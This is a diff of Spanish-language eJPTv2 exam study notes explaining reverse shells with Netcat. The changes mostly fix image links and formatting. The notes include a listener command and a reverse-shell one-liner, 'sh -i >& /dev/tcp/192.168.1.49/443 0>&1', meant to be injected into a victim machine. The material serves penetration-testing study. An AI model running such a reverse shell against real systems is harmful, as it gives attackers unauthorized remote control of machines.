@@ -9,7 +9,7 @@ https://www.revshells.com - Este es un generador de shell inversa en línea qu
 
 </aside>
 
-![image.png](https://github.com/TerragensPL/Apuntes-para-Examen-eJPTv2/blob/main/1%20-%20Conceptos%20B%C3%A1sicos%20de%20Hacking/Imagenes/image.png)
+![image.png](Imagenes/image.png)
 
 Ponemos el siguiente comando en nuestra maquina atacante **nc -nlvp 443** . Con esto ponemos el Netcat en escucha en el puerto 443.
 
@@ -18,28 +18,28 @@ Ponemos el siguiente comando en nuestra maquina atacante **nc -nlvp 443** . Con 
 <aside>
 💡
 
-**`nc`**: Invoca **la herramienta** Netcat.
+`nc`: Invoca **la herramienta** Netcat.
 
-**`-n`**: **Desactiva la resolución de nombres DNS**. Esto significa que solo se usarán direcciones IP sin intentar resolver nombres de dominio.
+`-n`: **Desactiva la resolución de nombres DNS**. Esto significa que solo se usarán direcciones IP sin intentar resolver nombres de dominio.
 
-`-**l**`: **Activa el modo de escucha** (listen), lo que **convierte Netcat en un servidor que espera conexiones entrantes**.
+`-l`: **Activa el modo de escucha** (listen), lo que **convierte Netcat en un servidor que espera conexiones entrantes**.
 
-`-**v**`: Habilita el modo "verboso" (verbose), proporcionando **información** detallada **sobre las conexiones**.
+`-v`: Habilita el modo "verboso" (verbose), proporcionando **información** detallada **sobre las conexiones**.
 
-`-**p 443**`: Especifica el **puerto** en el **que** Netcat **estará escuchando**, en este caso, el puerto 443 (comúnmente utilizado por HTTPS).
+`-p 443`: Especifica el **puerto** en el **que** Netcat **estará escuchando**, en este caso, el puerto 443 (comúnmente utilizado por HTTPS).
 
 </aside>
 
-![image.png](https://github.com/TerragensPL/Apuntes-para-Examen-eJPTv2/blob/main/1%20-%20Conceptos%20B%C3%A1sicos%20de%20Hacking/Imagenes/9d3054ff-5a86-428a-bcc8-294f30a5ddb7.png)
+![image.png](Imagenes/9d3054ff-5a86-428a-bcc8-294f30a5ddb7.png)
 
 Si conseguimos acceso a muestra maquina victima debemos inyectar el comando que habíamos conseguido con el reverse shell generator. 
 
 `sh -i >& /dev/tcp/192.168.1.49/443 0>&1`
 
-![image.png](https://github.com/TerragensPL/Apuntes-para-Examen-eJPTv2/blob/main/1%20-%20Conceptos%20B%C3%A1sicos%20de%20Hacking/Imagenes/image%201.png)
+![image.png](Imagenes/image%201.png)
 
 Nuestra maquina atacante Kali reacciona a la señal de la maquina victima, originado que tengamos abierta una terminal interactiva sobre la maquina victima.
 
-![image.png](https://github.com/TerragensPL/Apuntes-para-Examen-eJPTv2/blob/main/1%20-%20Conceptos%20B%C3%A1sicos%20de%20Hacking/Imagenes/image%202.png)
+![image.png](Imagenes/image%202.png)
 
-![image.png](https://github.com/TerragensPL/Apuntes-para-Examen-eJPTv2/blob/main/1%20-%20Conceptos%20B%C3%A1sicos%20de%20Hacking/Imagenes/image%203.png)
+![image.png](Imagenes/image%203.png)
